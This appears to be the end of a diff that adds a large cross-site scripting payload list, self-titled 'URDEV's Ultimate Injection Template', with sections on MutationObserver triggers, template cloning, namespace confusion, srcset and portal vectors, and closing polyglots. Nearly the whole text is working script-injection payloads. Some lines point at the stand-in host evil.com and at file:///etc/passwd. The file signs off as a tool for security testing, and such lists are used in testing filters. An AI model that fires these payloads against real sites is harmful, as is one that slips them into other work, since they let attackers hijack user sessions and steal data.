while(w.nextNode()){} </script>
+========================
+MUTATION OBSERVER TRIGGERS
+========================
+
+<script> new MutationObserver(()=>console.log('URDEV_OBSERVER')) .observe(document.body,{childList:true}); document.body.innerHTML+='<x>' </script><script> new MutationObserver(()=>confirm(2)) .observe(document.head,{childList:true}); document.head.innerHTML+='<x>' </script><script> new MutationObserver(()=>prompt(3)) .observe(document.documentElement,{childList:true}); document.documentElement.innerHTML+='<x>' </script><script> new MutationObserver(()=>print()) .observe(document.body,{attributes:true}); document.body.setAttribute('x','y') </script><script> new MutationObserver(()=>console.log(4)) .observe(document.body,{characterData:true}); document.body.firstChild.textContent+='x' </script><script> new MutationObserver(()=>confirm(5)) .observe(document.body,{subtree:true}); document.body.innerHTML+='<x>' </script><script> new MutationObserver(()=>prompt(6)) .observe(document.body,{attributeOldValue:true}); document.body.setAttribute('x','y') </script><script> new MutationObserver(()=>print()) .observe(document.body,{characterDataOldValue:true}); document.body.firstChild.textContent+='x' </script>
+========================
+CUSTOM EVENT DISPATCHING
+========================
+
+<script> addEventListener('x',()=>confirm('URDEV_EVENT')); dispatchEvent(new Event('x')) </script><script> addEventListener('y',()=>prompt(2)); dispatchEvent(new CustomEvent('y')) </script><script> addEventListener('z',()=>print()); dispatchEvent(new MouseEvent('z')) </script><script> addEventListener('urdev',()=>console.log(3)); dispatchEvent(new KeyboardEvent('urdev')) </script><script> addEventListener('inject',()=>confirm(4)); dispatchEvent(new FocusEvent('inject')) </script><script> addEventListener('payload',()=>prompt(5)); dispatchEvent(new InputEvent('payload')) </script><script> addEventListener('exploit',()=>print()); dispatchEvent(new CompositionEvent('exploit')) </script><script> addEventListener('xss',()=>console.log(6)); dispatchEvent(new UIEvent('xss')) </script><script> addEventListener('test',()=>confirm(7)); dispatchEvent(new TouchEvent('test')) </script><script> addEventListener('demo',()=>prompt(8)); dispatchEvent(new WheelEvent('demo')) </script>
+========================
+ATTRIBUTE NODE DIRECT INJECTION
+========================
+
+<script> a=document.createAttribute('onmouseover'); a.value='console.log("URDEV_ATTR")'; document.body.setAttributeNode(a) </script><script> a=document.createAttribute('onclick'); a.value='confirm(2)'; document.body.setAttributeNode(a) </script><script> a=document.createAttribute('onload'); a.value='prompt(3)'; document.body.setAttributeNode(a) </script><script> a=document.createAttribute('onerror'); a.value='print()'; document.body.setAttributeNode(a) </script><script> a=document.createAttribute('onfocus'); a.value='console.log(4)'; document.body.setAttributeNode(a) </script><script> a=document.createAttribute('onblur'); a.value='confirm(5)'; document.body.setAttributeNode(a) </script><script> a=document.createAttribute('onsubmit'); a.value='prompt(6)'; document.body.setAttributeNode(a) </script><script> a=document.createAttribute('onchange'); a.value='print()'; document.body.setAttributeNode(a) </script><script> a=document.createAttribute('onselect'); a.value='console.log(7)'; document.body.setAttributeNode(a) </script><script> a=document.createAttribute('onreset'); a.value='confirm(8)'; document.body.setAttributeNode(a) </script>
+========================
+DOCUMENT FRAGMENT EXPLOITATION
+========================
+
+<script> f=document.createDocumentFragment(); d=document.createElement('img'); d.onerror=()=>confirm('URDEV_FRAGMENT'); d.src='x';f.appendChild(d);document.body.appendChild(f) </script><script> f=document.createDocumentFragment(); d=document.createElement('svg'); d.onload=()=>prompt(2); f.appendChild(d);document.body.appendChild(f) </script><script> f=document.createDocumentFragment(); d=document.createElement('script'); d.text='print()'; f.appendChild(d);document.body.appendChild(f) </script><script> f=document.createDocumentFragment(); d=document.createElement('iframe'); d.srcdoc='<script>console.log(3)'; f.appendChild(d);document.body.appendChild(f) </script><script> f=document.createDocumentFragment(); d=document.createElement('object'); d.data='javascript:confirm(4)'; f.appendChild(d);document.body.appendChild(f) </script><script> f=document.createDocumentFragment(); d=document.createElement('embed'); d.src='javascript:prompt(5)'; f.appendChild(d);document.body.appendChild(f) </script><script> f=document.createDocumentFragment(); d=document.createElement('applet'); d.code='x'; d.onerror=()=>print(); f.appendChild(d);document.body.appendChild(f) </script>
+========================
+ADOPTNODE & IMPORTNODE TRANSFERS
+========================
+
+<script> i=document.implementation.createHTMLDocument(''); i.body.innerHTML='<img src=x onerror=console.log("URDEV_ADOPT")>'; document.body.appendChild(document.adoptNode(i.body)) </script><script> i=document.implementation.createHTMLDocument(''); i.body.innerHTML='<svg onload=confirm(2)>'; document.body.appendChild(document.importNode(i.body,true)) </script><script> i=document.implementation.createHTMLDocument(''); i.body.innerHTML='<iframe srcdoc="<script>prompt(3)">'; document.body.appendChild(document.adoptNode(i.body.firstChild)) </script><script> i=document.implementation.createHTMLDocument(''); i.body.innerHTML='<object data=javascript:print()>'; document.body.appendChild(document.importNode(i.body.firstChild,true)) </script><script> i=document.implementation.createHTMLDocument(''); i.body.innerHTML='<embed src=javascript:console.log(4)>'; document.body.appendChild(document.adoptNode(i.body.firstChild)) </script><script> i=document.implementation.createHTMLDocument(''); i.body.innerHTML='<applet code=x onerror=confirm(5)>'; document.body.appendChild(document.importNode(i.body.firstChild,true)) </script><script> i=document.implementation.createHTMLDocument(''); i.body.innerHTML='<marquee onstart=prompt(6)>'; document.body.appendChild(document.adoptNode(i.body.firstChild)) </script>
+========================
+INERT ATTRIBUTE BYPASSES
+========================
+
+<div inert id=x><img src=x onerror=confirm('URDEV_INERT')></div> <script>x.inert=false</script> <div inert id=y><svg onload=prompt(2)></svg></div> <script>y.inert=null</script> <div inert id=z><iframe srcdoc="<script>print()"></iframe></div> <script>z.removeAttribute('inert')</script> <div inert id=a><object data=javascript:console.log(3)></object></div> <script>a.attributes.removeNamedItem('inert')</script> <div inert id=b><embed src=javascript:confirm(4)></embed></div> <script>b.setAttribute('inert','false')</script> <div inert id=c><applet code=x onerror=prompt(5)></applet></div> <script>c.inert=0</script> <div inert id=d><marquee onstart=print()></marquee></div> <script>d.inert=undefined</script>
+========================
+TEMPLATE CONTENT ACTIVATION
+========================
+<template id=t><img src=x onerror=console.log('URDEV_TEMPLATE')></template>
+
+<script>document.body.append(t.content.cloneNode(true))</script>
+<template id=u><svg onload=confirm(2)></svg></template>
+
+<script>document.body.append(u.content.cloneNode(true))</script>
+<template id=v><iframe srcdoc="<script>prompt(3)"></iframe></template>
+
+<script>document.body.append(v.content.cloneNode(true))</script>
+<template id=w><object data=javascript:print()></object></template>
+
+<script>document.body.append(w.content.cloneNode(true))</script>
+<template id=x><embed src=javascript:console.log(4)></embed></template>
+
+<script>document.body.append(x.content.cloneNode(true))</script>
+<template id=y><applet code=x onerror=confirm(5)></applet></template>
+
+<script>document.body.append(y.content.cloneNode(true))</script>
+<template id=z><marquee onstart=prompt(6)></marquee></template>
+
+<script>document.body.append(z.content.cloneNode(true))</script>
+========================
+DETAILS & SUMMARY AUTO-OPEN TRIGGERS
+========================
+
+<details open ontoggle=confirm('URDEV_DETAILS')><summary>x</summary></details> <details open ontoggle=prompt(2)><summary>y</summary></details> <details open ontoggle=print()><summary>z</summary></details> <details open onmouseenter=console.log(3)><summary>a</summary></details> <details open onmouseleave=confirm(4)><summary>b</summary></details> <details open onfocus=prompt(5) tabindex=0><summary>c</summary></details> <details open onblur=print() tabindex=0><summary>d</summary></details> <details open onclick=console.log(6)><summary>e</summary></details> <details open ondblclick=confirm(7)><summary>f</summary></details> <details open oncontextmenu=prompt(8)><summary>g</summary></details> <details open onkeydown=print() tabindex=0><summary>h</summary></details> <details open onkeyup=console.log(9) tabindex=0><summary>i</summary></details>
+========================
+PICTURE & SOURCE FALLBACK CHAINS
+========================
+<picture>
+<source srcset=x onerror=console.log('URDEV_PICTURE')>
+<img src=x onerror=confirm(2)>
+</picture>
+<picture>
+<source srcset=javascript:prompt(3)>
+<img src=x onerror=print()>
+</picture>
+<picture>
+<source srcset=data:image/svg+xml,<svg onload=console.log(4)>
+<img src=x onerror=confirm(5)>
+</picture>
+<picture>
+<source srcset=//evil.com/x onerror=prompt(6)>
+<img src=x onerror=print()>
+</picture>
+<picture>
+<source srcset=about:blank onerror=console.log(7)>
+<img src=x onerror=confirm(8)>
+</picture>
+<picture>
+<source srcset=file:///etc/passwd onerror=prompt(9)>
+<img src=x onerror=print()>
+</picture>
+
+========================
+OBJECT PARAM ELEMENT INJECTION
+========================
+<object data=x><param name=movie value=javascript:console.log('URDEV_PARAM')></object>
+<object data=x><param name=src value=javascript:confirm(2)></object>
+<object data=x><param name=code value=javascript:prompt(3)></object>
+<object data=x><param name=url value=javascript:print()></object>
+<object data=x><param name=href value=javascript:console.log(4)></object>
+<object data=x><param name=action value=javascript:confirm(5)></object>
+<object data=x><param name=formaction value=javascript:prompt(6)></object>
+<object data=x><param name=background value=javascript:print()></object>
+<object data=x><param name=poster value=javascript:console.log(7)></object>
+<object data=x><param name=icon value=javascript:confirm(8)></object>
+<object data=x><param name=archive value=javascript:prompt(9)></object>
+<object data=x><param name=codebase value=javascript:print()></object>
+
+========================
+FORMDATA ITERATION & EXPOSURE
+========================
+
+<script> f=new FormData();f.append('x','<img src=x onerror=confirm("URDEV_FORMDATA")>'); for(v of f.values())document.write(v) </script><script> f=new FormData();f.append('y','<svg onload=prompt(2)>'); for(v of f.values())document.body.innerHTML=v </script><script> f=new FormData();f.append('z','<iframe srcdoc="<script>print()">'); for(v of f.values())document.head.innerHTML=v </script><script> f=new FormData();f.append('a','<object data=javascript:console.log(3)>'); for(v of f.values())document.title=v </script><script> f=new FormData();f.append('b','<embed src=javascript:confirm(4)>'); for(v of f.values())location.href=v </script><script> f=new FormData();f.append('c','<applet code=x onerror=prompt(5)>'); for(v of f.values())history.replaceState(null,null,v) </script><script> f=new FormData();f.append('d','<marquee onstart=print()>'); for(v of f.values())localStorage.x=v </script>
+========================
+URL API CONSTRUCTION & REWRITE
+========================
+
+<script> u=new URL('https://x/#<svg onload=console.log("URDEV_URL")>'); document.write(u.hash) </script><script> u=new URL('javascript:confirm(2)'); location.href=u.href </script><script> u=new URL('data:text/html,<script>prompt(3)'); document.write(u.protocol) </script><script> u=new URL('blob:https://example.com/uuid'); document.write(u.origin) </script><script> u=new URL('file:///etc/passwd'); document.write(u.pathname) </script><script> u=new URL('\\evil.com\share'); document.write(u.host) </script><script> u=new URL('gopher://evil.com:70/_GET'); document.write(u.hostname) </script><script> u=new URL('view-source:javascript:print()'); document.write(u.protocol) </script>
+========================
+SANITIZER BYPASS & PARSER EDGE CASES
+========================
+<svg><g/onload=confirm('URDEV_SANITIZER')></g></svg>
+<svg><g/onload=prompt(2)></g></svg>
+<svg><g/onload=print()></g></svg>
+<svg><g onload=console.log(3)/></svg>
+<svg><g onload=confirm(4)/></svg>
+<svg><g onload=prompt(5)/></svg>
+<svg><g onload=print()/></svg>
+<svg><g onload="console.log(6)"/></svg>
+<svg><g onload="confirm(7)"/></svg>
+<svg><g onload="prompt(8)"/></svg>
+<svg><g onload="print()"/></svg>
+<svg><g onload=console.log(9)></g></svg>
+<svg><g onload=confirm(10)></g></svg>
+
+========================
+NAMESPACE CONFUSION & MIXING
+========================
+<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:console.log('URDEV_NAMESPACE')">x</a></svg>
+<math xmlns="http://www.w3.org/1998/Math/MathML"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:confirm(2)">y</a></math>
+
+<html xmlns="http://www.w3.org/1999/xhtml"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:prompt(3)">z</a></html> <svg xmlns="http://www.w3.org/2000/svg"><script xmlns="http://www.w3.org/1999/xhtml">print()</script></svg> <math xmlns="http://www.w3.org/1998/Math/MathML"><script xmlns="http://www.w3.org/1999/xhtml">console.log(4)</script></math> <html xmlns="http://www.w3.org/1999/xhtml"><script xmlns="http://www.w3.org/1999/xhtml">confirm(5)</script></html> <svg xmlns="http://www.w3.org/2000/svg"><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="<script>prompt(6)"></iframe></svg> <math xmlns="http://www.w3.org/1998/Math/MathML"><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="<script>print()"></iframe></math> <html xmlns="http://www.w3.org/1999/xhtml"><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="<script>console.log(7)"></iframe></html>
+========================
+XHTML MIME TYPE EDGE CASES
+========================
+
+<html xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=confirm('URDEV_XHTML') /></html> <html xmlns="http://www.w3.org/1999/xhtml"><svg onload=prompt(2) /></html> <html xmlns="http://www.w3.org/1999/xhtml"><iframe srcdoc="<script>print()" /></html> <html xmlns="http://www.w3.org/1999/xhtml"><object data=javascript:console.log(3) /></html> <html xmlns="http://www.w3.org/1999/xhtml"><embed src=javascript:confirm(4) /></html> <html xmlns="http://www.w3.org/1999/xhtml"><applet code=x onerror=prompt(5) /></html> <html xmlns="http://www.w3.org/1999/xhtml"><marquee onstart=print() /></html> <html xmlns="http://www.w3.org/1999/xhtml"><video autoplay oncanplay=console.log(6) /></html> <html xmlns="http://www.w3.org/1999/xhtml"><audio src onerror=confirm(7) /></html> <html xmlns="http://www.w3.org/1999/xhtml"><body onload=prompt(8) /></html>
+========================
+FORM-ASSOCIATED ELEMENT ACTIONS
+========================
+<button formaction=javascript:console.log('URDEV_FORMACTION')>go</button>
+<input formaction=javascript:confirm(2) type=submit value=go>
+
+<textarea formaction=javascript:prompt(3)></textarea>
+<select formaction=javascript:print()></select>
+
+<fieldset formaction=javascript:console.log(4)></fieldset> <output formaction=javascript:confirm(5)></output> <meter formaction=javascript:prompt(6)></meter> <progress formaction=javascript:print()></progress> <keygen formaction=javascript:console.log(7)></keygen> <label formaction=javascript:confirm(8)></label> <legend formaction=javascript:prompt(9)></legend> <datalist formaction=javascript:print()></datalist> <option formaction=javascript:console.log(10)></option>
+========================
+DATALIST & OPTION EVENT BUBBLING
+========================
+<input list=l oninput=confirm('URDEV_DATALIST')>
+<datalist id=l><option value=x></option></datalist>
+<input list=m onchange=prompt(2)>
+<datalist id=m><option value=y></option></datalist>
+<input list=n onfocus=print()>
+<datalist id=n><option value=z></option></datalist>
+<input list=o onblur=console.log(3)>
+<datalist id=o><option value=a></option></datalist>
+<input list=p onselect=confirm(4)>
+<datalist id=p><option value=b></option></datalist>
+<input list=q oninvalid=prompt(5) required pattern=^$>
+<datalist id=q><option value=c></option></datalist>
+<input list=r onreset=print()>
+<datalist id=r><option value=d></option></datalist>
+<input list=s onsearch=console.log(6)>
+<datalist id=s><option value=e></option></datalist>
+
+========================
+TRACK & CUE EVENT HANDLERS
+========================
+<video><track default oncuechange=console.log('URDEV_CUE')></video>
+<audio><track default oncuechange=confirm(2)></audio>
+<video><track oncuechange=prompt(3)></video>
+<audio><track oncuechange=print()></audio>
+<video><track onload=console.log(4)></video>
+<audio><track onload=confirm(5)></audio>
+<video><track onerror=prompt(6)></video>
+<audio><track onerror=print()></audio>
+<video><track oncanplay=console.log(7)></video>
+<audio><track oncanplay=confirm(8)></audio>
+<video><track oncanplaythrough=prompt(9)></video>
+<audio><track oncanplaythrough=print()></audio>
+
+========================
+TIME UPDATE & PROGRESS EVENTS
+========================
+<video ontimeupdate=confirm('URDEV_TIME')></video>
+<progress value=1 max=2 onmouseover=console.log('URDEV_PROGRESS')></progress>
+<audio ontimeupdate=prompt(2)></audio>
+<meter value=1 min=0 max=2 onmouseenter=print()></meter>
+<video onprogress=console.log(3)></video>
+<progress onprogress=confirm(4)></progress>
+<audio onprogress=prompt(5)></audio>
+<meter onprogress=print()></meter>
+<video onwaiting=console.log(6)></video>
+<progress onwaiting=confirm(7)></progress>
+<audio onwaiting=prompt(8)></audio>
+<meter onwaiting=print()></meter>
+
+========================
+EMBEDDED SVG IN IMG SOURCES
+========================
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='confirm('URDEV_SVGIMG')'>">
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='prompt(2)'>">
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='print()'>">
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>console.log(3)</script>">
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><iframe srcdoc='<script>confirm(4)'></iframe>">
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><object data=javascript:prompt(5)></object>">
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><embed src=javascript:print()></embed>">
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><applet code=x onerror=console.log(6)></applet>">
+
+========================
+FRAME SRCSET ATTRIBUTE EXPLOITS
+========================
+
+<iframe srcset="javascript:console.log('URDEV_SRCSET') 1x"></iframe> <img srcset="javascript:confirm(2) 1x"> <video srcset="javascript:prompt(3) 1x"></video> <audio srcset="javascript:print() 1x"></audio> <picture><source srcset="javascript:console.log(4) 1x"></picture> <iframe srcset="data:text/html,<script>confirm(5) 1x"></iframe> <img srcset="data:image/svg+xml,<svg onload=prompt(6)> 1x"> <video srcset="data:video/mp4,<script>print() 1x"></video> <audio srcset="data:audio/wav,<script>console.log(7) 1x"></audio> <picture><source srcset="blob:https://example.com/uuid 1x"></picture>
+========================
+DIALOG ELEMENT MODAL EXECUTION
+========================
+
+<dialog open onclose=confirm('URDEV_DIALOG')>x</dialog> <dialog open oncancel=prompt(2)>y</dialog> <dialog open onmouseenter=print()>z</dialog> <dialog open onmouseleave=console.log(3)>a</dialog> <dialog open onfocus=confirm(4) tabindex=0>b</dialog> <dialog open onblur=prompt(5) tabindex=0>c</dialog> <dialog open onclick=print()>d</dialog> <dialog open ondblclick=console.log(6)>e</dialog> <dialog open oncontextmenu=confirm(7)>f</dialog> <dialog open onkeydown=prompt(8) tabindex=0>g</dialog> <dialog open onkeyup=print() tabindex=0>h</dialog>
+========================
+PORTAL ELEMENT (EXPERIMENTAL) EXPLOITS
+========================
+<portal src="javascript:console.log('URDEV_PORTAL')"></portal>
+<portal src="data:text/html,<script>confirm(2)"></portal>
+<portal src="blob:https://example.com/uuid"></portal>
+<portal src="about:blank"></portal>
+<portal src="//evil.com/x"></portal>
+<portal src="file:///etc/passwd"></portal>
+<portal src="\\evil.com\share"></portal>
+<portal src="gopher://evil.com:70/_GET"></portal>
+<portal src="view-source:javascript:prompt(3)"></portal>
+<portal src="jar:http://example.com/plugin.jar!/"></portal>
+<portal src="mhtml:http://evil.com/payload.mht!x.html"></portal>
+
+========================
+URDEV'S ULTIMATE POLYGLOT FINALE (i really like polyglot, sorry xD)
+========================
+"></dialog></portal></template></slot></summary></details></datalist></option></picture></video></audio></iframe></object></embed></style></script><svg/onload=console.log('URDEV_FINALE1')><!-- '><!--</title></textarea></noscript></noframes></noembed></template></slot></summary></details></datalist></option></picture></video></audio></iframe></object></embed></style></script><img src=x onerror=confirm('URDEV_FINALE2')> javascript:"/*'/*`/*--></styles></script></title></textarea></noscript></noframes></noembed></template></slot></summary></details></datalist></option></picture></video></audio></iframe></object></embed></style></script><svg onload=prompt('URDEV_FINALE3')>-->
+"></base></bgsound></body></caption></col></colgroup></frame></frameset></head></html></iframe></layer></legend></link></meta></noembed></noframes></noscript></object></option></param></plaintext></script></style></tbody></td></textarea></tfoot></th></thead></title></tr></xmp><svg/onload=print()><!--<!--URDEV ULTIMATE INJECTION TEMPLATE v3.0-->
+
+END OF URDEV'S ULTIMATE INJECTION TEMPLATE
+CATEGORIES: 100+ | PAYLOADS: 1000+ | VECTORS: COMPREHENSIVE
+USE RESPONSIBLY FOR SECURITY TESTING ONLY
+
+Love y'all :)
